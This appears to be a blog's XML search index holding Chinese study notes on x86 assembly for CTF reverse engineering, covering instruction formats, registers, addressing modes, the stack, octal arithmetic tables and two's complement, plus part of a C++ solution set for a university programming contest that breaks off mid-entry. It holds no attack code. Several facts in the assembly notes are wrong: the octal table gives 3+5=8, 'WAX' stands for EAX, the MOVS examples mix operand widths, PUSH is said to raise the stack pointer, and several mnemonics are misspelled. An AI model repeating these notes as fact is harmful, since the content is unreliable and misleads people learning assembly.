&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编-学习笔记</title>
      <link href="/2020/12/dfbbeb49.html"/>
      <url>/2020/12/dfbbeb49.html</url>
      
        <content type="html"><![CDATA[<h1 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h1><h2 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h2><table><thead><tr><th>指令格式</th><th>指令解释</th></tr></thead><tbody><tr><td>MOV r&#x2F;m8,r8</td><td>r通用寄存器</td></tr><tr><td>MOV r&#x2F;m16,r16</td><td>m代表内存</td></tr><tr><td>MOV r&#x2F;m32,r32</td><td>imm代表立即数</td></tr><tr><td>MOV r8,r&#x2F;m8</td><td>r8代表8位通用寄存器</td></tr><tr><td>MOV r16,r&#x2F;m16</td><td>m8代表8位内存</td></tr><tr><td>MOV r32,r&#x2F;m32</td><td>imm8代表8位立即数</td></tr><tr><td>MOV r8, imm8</td><td></td></tr><tr><td>MOV r16, imm16</td><td></td></tr><tr><td>MOV r32, imm32</td><td></td></tr></tbody></table><h2 id="ADD指令"><a href="#ADD指令" class="headerlink" title="ADD指令"></a>ADD指令</h2><p>指令格式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">ADD</span> r/m8, imm8<br><span class="hljs-built_in">ADD</span> r/m16,imm16<br><span class="hljs-built_in">ADD</span> r/m32,imm32<br><span class="hljs-built_in">ADD</span> r/m16,imm8<br><span class="hljs-built_in">ADD</span> r/m32,imm8<br><span class="hljs-built_in">ADD</span> r/m8,r8<br><span class="hljs-built_in">ADD</span> r/m16,r16<br><span class="hljs-built_in">ADD</span> r/m32,r32<br><span class="hljs-built_in">ADD</span> r8,r/m8<br><span class="hljs-built_in">ADD</span> r16,r/m16<br><span class="hljs-built_in">ADD</span> r32,r/m32<br></code></pre></td></tr></table></figure><h2 id="SUB指令-减法"><a href="#SUB指令-减法" class="headerlink" title="SUB指令(减法)"></a>SUB指令(减法)</h2><p>指令格式:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">SUB</span> r/<span class="hljs-name">m8</span>, im<span class="hljs-name">m8</span><br></code></pre></td></tr></table></figure><h2 id="AND指令"><a href="#AND指令" class="headerlink" title="AND指令"></a>AND指令</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">AND</span> r/m8, imm8<br></code></pre></td></tr></table></figure><h2 id="OR指令"><a href="#OR指令" class="headerlink" title="OR指令"></a>OR指令</h2><p>逻辑或运算，对两个值进行或运算</p><h2 id="XOR指令-异或运算"><a href="#XOR指令-异或运算" class="headerlink" title="XOR指令(异或运算)"></a>XOR指令(异或运算)</h2><h2 id="NOT指令"><a href="#NOT指令" class="headerlink" title="NOT指令"></a>NOT指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">NOT r/m8<br>NOT r/m16<br>NOT r/m32<br></code></pre></td></tr></table></figure><h2 id="MOVS指令：移动数据-内存-gt-内存"><a href="#MOVS指令：移动数据-内存-gt-内存" class="headerlink" title="MOVS指令：移动数据 内存-&gt;内存"></a>MOVS指令：移动数据 内存-&gt;内存</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">MOVS <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">ES</span>:[<span class="hljs-built_in">EDI</span>],<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ESI</span>]<br>MOVS <span class="hljs-built_in">WORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">ES</span>:[<span class="hljs-built_in">EDI</span>],<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ESI</span>]<br>MOVS <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">ES</span>:[<span class="hljs-built_in">EDI</span>],<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ESI</span>]<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RE-学习记录-汇编-2</title>
      <link href="/2020/12/134388c0.html"/>
      <url>/2020/12/134388c0.html</url>
      
        <content type="html"><![CDATA[<h1 id="汇编工具DTDebug"><a href="#汇编工具DTDebug" class="headerlink" title="汇编工具DTDebug"></a>汇编工具DTDebug</h1><p>下载后设置好odd与插件路径，同时在属性中设置为管理员身份运行（无Administrator权限进入的时候一直在提示）</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>存储数据：</p><p>CPU&gt;内存&gt;硬盘</p><p>32位CPU: 8 16 32</p><p>64位CPU: 8 16 32 64</p><p>EIP:存储CPU下一次执行的指令集，不能作他用</p><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><h3 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h3><table><thead><tr><th>32位</th><th>16位</th><th>8位</th></tr></thead><tbody><tr><td>WAX</td><td>AX</td><td>AL（低8位）</td></tr><tr><td>ECX</td><td>CX</td><td>CL</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td></tr><tr><td>ESP</td><td>SP</td><td>AH（高8位）</td></tr><tr><td>EBP</td><td>BP</td><td>CH</td></tr><tr><td>ESI</td><td>SI</td><td>DH</td></tr><tr><td>EDI</td><td>DI</td><td>BH</td></tr></tbody></table><p>8位，16位寄存器同时存在于32位之中，8位指令改32位中的1位，16位改4位</p><h2 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h2><ol><li><p>立即数到寄存器</p></li><li><p>寄存器到寄存器</p></li><li><p>寄存器到内存</p></li><li><p>内存到寄存器</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-number">1</span>//把<span class="hljs-number">1</span>存储到<span class="hljs-built_in">EAX</span>寄存器<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EDX</span>,<span class="hljs-built_in">EAX</span>//把<span class="hljs-built_in">EAX</span>里面的值存到<span class="hljs-built_in">EDX</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>[存储地址]<br></code></pre></td></tr></table></figure><p>已经申请过的地址，在堆栈窗口内找，可以直接使用</p><blockquote><p>一个字节-Byte</p><p>两个字节-WORD</p><p>四个字节-DWORD</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[],<span class="hljs-built_in">EAX</span>//前提需要保证宽度相同<br></code></pre></td></tr></table></figure><h2 id="内存地址的5种形式"><a href="#内存地址的5种形式" class="headerlink" title="内存地址的5种形式"></a>内存地址的5种形式</h2><ol><li><p>[立即数]</p><p>读取内存的值:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-number">0x13FFC4</span>]<br></code></pre></td></tr></table></figure><p>向内存写入数据</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-number">0x13FFC4</span>],<span class="hljs-built_in">EAX</span><br></code></pre></td></tr></table></figure></li><li><p>[reg]  <em><strong>reg代表寄存器 可以是8个通用寄存器中的一个</strong></em></p><p>读取内存的值：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">0x13FFD0</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ECX</span>]<br></code></pre></td></tr></table></figure><p>向内存中写入数据：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EDX</span>,<span class="hljs-number">0x13FFD8</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EDX</span>],<span class="hljs-number">0x87654321</span><br></code></pre></td></tr></table></figure></li><li><p>[reg+立即数]</p><p>读取内存的值：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">0x13FFD0</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ECX</span>+<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>向内存中写入数据：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EDX</span>,<span class="hljs-number">0x13FFD8</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EDX</span>+<span class="hljs-number">0xC</span>],<span class="hljs-number">0x87654321</span><br></code></pre></td></tr></table></figure></li><li><p>[reg+reg*{1,2,4,8}] (数组的汇编形式)</p><p>代表八个32位的寄存器加上八个32位寄存器乘以1，2，4，8</p><p>读取内存的值：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,13FFC4<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EDX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EAX</span>+<span class="hljs-built_in">ECX</span>*<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>向内存中写入数据:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,13FFC4<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EAX</span>+<span class="hljs-built_in">EAX</span>*<span class="hljs-number">4</span>],<span class="hljs-number">87654321</span><br></code></pre></td></tr></table></figure></li><li><p>[reg+reg*{1,2,4,8}+立即数]</p><p>读取内存的值:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,13FFC4<br><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">2</span><br><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EDX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EAX</span>+<span class="hljs-built_in">ECX</span>*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>向内存中写入数据：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,13FFC4<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">ECX</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">EAX</span>+<span class="hljs-built_in">ECX</span>*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>],<span class="hljs-number">87654321</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="数据的存储模式"><a href="#数据的存储模式" class="headerlink" title="数据的存储模式"></a>数据的存储模式</h1><p>大端模式：数据高位在低位，数据低位在高位</p><p>小端模式：数据低位在低位，数据高位在高位</p><h1 id="MOVS指令"><a href="#MOVS指令" class="headerlink" title="MOVS指令"></a>MOVS指令</h1><p>BYTE&#x2F;WORD&#x2F;DWORD分别简写为MOVSB MOVSW MOVSD</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">MOVS <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">ES</span>:[<span class="hljs-built_in">EDI</span>],<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-built_in">ESI</span>]<br></code></pre></td></tr></table></figure><p>DF位置：每次MOVS指令之后地址减少相应变更（加减具体看DF的值）字节的地址</p><p>DF的值表示方向位：0为+，1为-</p><h1 id="STOS指令：将AL-x2F-AX-x2F-EAX的值存储到-EDI-的指定存储单元"><a href="#STOS指令：将AL-x2F-AX-x2F-EAX的值存储到-EDI-的指定存储单元" class="headerlink" title="STOS指令：将AL&#x2F;AX&#x2F;EAX的值存储到[EDI]的指定存储单元"></a>STOS指令：将AL&#x2F;AX&#x2F;EAX的值存储到[EDI]的指定存储单元</h1><p>STOS BYTE PTR ES:[EDI]</p><h1 id="REP指令"><a href="#REP指令" class="headerlink" title="REP指令"></a>REP指令</h1><p>MAV ECX,10</p><p>REP MOVESD&#x2F;&#x2F;ECX作为REP指令的计数器</p><p>EAX通常用作返回值</p><p>ESP,EBP通常用作堆栈</p><p>ESI,EDI通常用作串复制的首地址和目标地址</p><h1 id="堆栈相关指令"><a href="#堆栈相关指令" class="headerlink" title="堆栈相关指令"></a>堆栈相关指令</h1><p>堆栈的使用是从大地址向小地址使用</p><p>ESP 栈指针寄存器</p><h2 id="堆栈的使用"><a href="#堆栈的使用" class="headerlink" title="堆栈的使用"></a>堆栈的使用</h2><p>堆栈使用之后要改变ESP指向的位置，防止被覆盖</p><p>例如：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">ESP</span>,<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>使用之后取消：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">ADD</span> ESP,8<br></code></pre></td></tr></table></figure><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>C语言当中局部变量为何赋初始值的原因也就昭然若揭了，因为在内存中ESP寄存器只是指向了未被使用的堆栈，堆栈里面的内容会被覆盖，但是不会被清空，因此创建变量以后他的初始值是未知的，因此创建局部变量需要赋初值</p><h2 id="PUSH-amp-POP指令"><a href="#PUSH-amp-POP指令" class="headerlink" title="PUSH&amp;POP指令"></a>PUSH&amp;POP指令</h2><p>功能：</p><ol><li>将数压入栈顶</li><li>栈顶指针+1</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">PUSH</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[18FFA4]<br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">EAX</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">ECX</span><br></code></pre></td></tr></table></figure><h1 id="修改EIP的指令"><a href="#修改EIP的指令" class="headerlink" title="修改EIP的指令"></a>修改EIP的指令</h1><h2 id="KMP指令"><a href="#KMP指令" class="headerlink" title="KMP指令"></a>KMP指令</h2><p>MOV EIP简写为JMP</p><h2 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h2>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RE-学习记录-汇编</title>
      <link href="/2020/12/1a09cf7e.html"/>
      <url>/2020/12/1a09cf7e.html</url>
      
        <content type="html"><![CDATA[<h1 id="八进制运算"><a href="#八进制运算" class="headerlink" title="八进制运算"></a>八进制运算</h1><h2 id="加法表"><a href="#加法表" class="headerlink" title="加法表"></a>加法表</h2><table><thead><tr><th>1+1&#x3D;2</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>1+2&#x3D;3</td><td>2+2&#x3D;4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1+3&#x3D;4</td><td>2+3&#x3D;5</td><td>3+3&#x3D;6</td><td></td><td></td><td></td><td></td></tr><tr><td>1+4&#x3D;5</td><td>2+4&#x3D;6</td><td>3+4&#x3D;7</td><td>4+4&#x3D;10</td><td></td><td></td><td></td></tr><tr><td>1+5&#x3D;6</td><td>2+5&#x3D;7</td><td>3+5&#x3D;8</td><td>4+5&#x3D;11</td><td>5+5&#x3D;12</td><td></td><td></td></tr><tr><td>1+6&#x3D;7</td><td>2+6&#x3D;10</td><td>3+6&#x3D;11</td><td>4+6&#x3D;12</td><td>5+6&#x3D;13</td><td>6+6&#x3D;14</td><td></td></tr><tr><td>1+7&#x3D;10</td><td>2+7&#x3D;11</td><td>3+7&#x3D;12</td><td>4+7&#x3D;13</td><td>5+7&#x3D;14</td><td>6+7&#x3D;15</td><td>7+7&#x3D;16</td></tr></tbody></table><span id="more"></span><h2 id="乘法表"><a href="#乘法表" class="headerlink" title="乘法表"></a>乘法表</h2><table><thead><tr><th>1*1&#x3D;1</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>1*2&#x3D;2</td><td>2*2&#x3D;4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1*3&#x3D;3</td><td>2*3&#x3D;6</td><td>3*3&#x3D;11</td><td></td><td></td><td></td><td></td></tr><tr><td>1*4&#x3D;4</td><td>2*4&#x3D;10</td><td>3*4&#x3D;14</td><td>4*4&#x3D;20</td><td></td><td></td><td></td></tr><tr><td>1*5&#x3D;5</td><td>2*5&#x3D;12</td><td>3*5&#x3D;17</td><td>4*5&#x3D;24</td><td>5*5&#x3D;31</td><td></td><td></td></tr><tr><td>1*6&#x3D;6</td><td>2*6&#x3D;14</td><td>3*6&#x3D;22</td><td>4*6&#x3D;30</td><td>5*6&#x3D;36</td><td>6*6&#x3D;44</td><td></td></tr><tr><td>1*7&#x3D;7</td><td>2*7&#x3D;16</td><td>3*7&#x3D;25</td><td>4*7&#x3D;34</td><td>5*7&#x3D;43</td><td>6*7&#x3D;52</td><td>7*7&#x3D;61</td></tr></tbody></table><h1 id="十六进制表示二进制-全文背诵"><a href="#十六进制表示二进制-全文背诵" class="headerlink" title="十六进制表示二进制(全文背诵)"></a>十六进制表示二进制(全文背诵)</h1><p>十六进制可以简写二进制</p><table><thead><tr><th>二进制</th><th>十六进制</th></tr></thead><tbody><tr><td>0000</td><td>0</td></tr><tr><td>0001</td><td>1</td></tr><tr><td>0010</td><td>2</td></tr><tr><td>0011</td><td>3</td></tr><tr><td>0100</td><td>4</td></tr><tr><td>0101</td><td>5</td></tr><tr><td>0110</td><td>6</td></tr><tr><td>0111</td><td>7</td></tr><tr><td>1000</td><td>8</td></tr><tr><td>1001</td><td>9</td></tr><tr><td>1010</td><td>A</td></tr><tr><td>1011</td><td>B</td></tr><tr><td>1100</td><td>C</td></tr><tr><td>1101</td><td>D</td></tr><tr><td>1110</td><td>E</td></tr><tr><td>1111</td><td>F</td></tr></tbody></table><h1 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h1><h2 id="计算机中常见的数据宽度"><a href="#计算机中常见的数据宽度" class="headerlink" title="计算机中常见的数据宽度"></a>计算机中常见的数据宽度</h2><table><thead><tr><th>数据类型</th><th>宽度(位)</th><th>存储范围</th></tr></thead><tbody><tr><td>位(BIT)</td><td>1</td><td></td></tr><tr><td>字节(BYTE)</td><td>8</td><td>0~0xFF</td></tr><tr><td>字(Word)</td><td>16</td><td>0~0xFFFF</td></tr><tr><td>双字(DoubleWord)</td><td>32</td><td>0~0xFFFFFFFF</td></tr></tbody></table><p>超出最大宽度存储的内容会被丢弃</p><p>例如char x &#x3D; 0x1FF存入地址后1会被丢弃</p><h1 id="有符号数编码规则"><a href="#有符号数编码规则" class="headerlink" title="有符号数编码规则"></a>有符号数编码规则</h1><h3 id="正数原码补码反码相同"><a href="#正数原码补码反码相同" class="headerlink" title="正数原码补码反码相同"></a>正数原码补码反码相同</h3><p>1 -&gt; 0 0 0 0 0 0 0 1</p><p>6 -&gt; 0 0 0 0 0 1 1 0</p><h3 id="负数原码反码补码编码规则"><a href="#负数原码反码补码编码规则" class="headerlink" title="负数原码反码补码编码规则"></a>负数原码反码补码编码规则</h3><p>原码：最高位为符号位，其余各位为数值本身的绝对值</p><p>反码：</p><ol><li>正数：反码与原码相同</li><li>负数：符号位为1，其余位对原码取反</li></ol><p>补码</p><ol><li><p>正数：补码与源码相同</p></li><li><p>负数：符号位为1，其余位对原码取反加1</p><p>-1</p><p>1 0 0 0 0 0 0 1__原码__</p><p>1 1 1 1 1 1 1 0__反码__</p><p>1 1 1 1 1 1 1 1__补码__</p><p>-7</p><p>1 0 0 0 0 1 1 1</p><p>1 1 1 1 1 0 0 0</p><p>1 1 1 1 1 0 0 1</p></li></ol><h1 id="4-5-x3D-的运算过程"><a href="#4-5-x3D-的运算过程" class="headerlink" title="4+5&#x3D;?的运算过程"></a>4+5&#x3D;?的运算过程</h1><ol><li><p>异或</p><p>​        0000 0100 XOR 0000 0101 &#x3D; 0000 0001</p></li><li><p>判断是否有进位</p><p>0000 0100 &amp; 0000 0101&#x3D;0000 0100</p><p>&amp;运算后，全0则无进位，有1则在1所在位数+1的位数进1，此处&amp;运算后值不为0</p></li><li><p>继续异或</p><p>0000 0001 XOR 0000 1000 &#x3D; 0000 1001</p></li><li><p>判断是否有进位</p><p>0000 0001 &amp; 0000 1000 &#x3D; 0000 0000</p></li></ol><h1 id="4-5-x3D-的运算过程-1"><a href="#4-5-x3D-的运算过程-1" class="headerlink" title="4-5&#x3D;?的运算过程"></a>4-5&#x3D;?的运算过程</h1><p>4-5&#x3D;4+(-5)</p><ol><li><p>异或</p><p>0000 0100 XOR 1111 1011 &#x3D; 1111 1111</p></li><li><p>判断是否有进位</p><p>0000 0100 &amp; 1111 1011 &#x3D; 0000 0000</p></li><li><p>故结果为1111 1111&#x3D;FF&#x3D;-1</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFU15届校赛-大二组</title>
      <link href="/2020/12/8a3e9951.html"/>
      <url>/2020/12/8a3e9951.html</url>
      
        <content type="html"><![CDATA[<h1 id="A-小林找工作"><a href="#A-小林找工作" class="headerlink" title="A.小林找工作"></a>A.小林找工作</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> p[MAXN];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;p[i]);<br>&#125;<br>sort(p+<span class="hljs-number">1</span>,p+n+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>&#123;<br><span class="hljs-type">int</span> temp;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;temp);<br><span class="hljs-type">int</span> pos=lower_bound(p+<span class="hljs-number">1</span>,p+n+<span class="hljs-number">1</span>,temp)-p;<br><span class="hljs-keyword">if</span>(pos&gt;n)pos=n;<br><span class="hljs-type">int</span> ans=<span class="hljs-built_in">abs</span>(temp-p[pos]);<br><span class="hljs-keyword">if</span>(pos!=<span class="hljs-number">1</span>)ans=min(ans, <span class="hljs-built_in">abs</span>(temp-p[pos<span class="hljs-number">-1</span>]));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ans);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h1 id="B-xx的树"><a href="#B-xx的树" class="headerlink" title="B.xx的树"></a>B.xx的树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 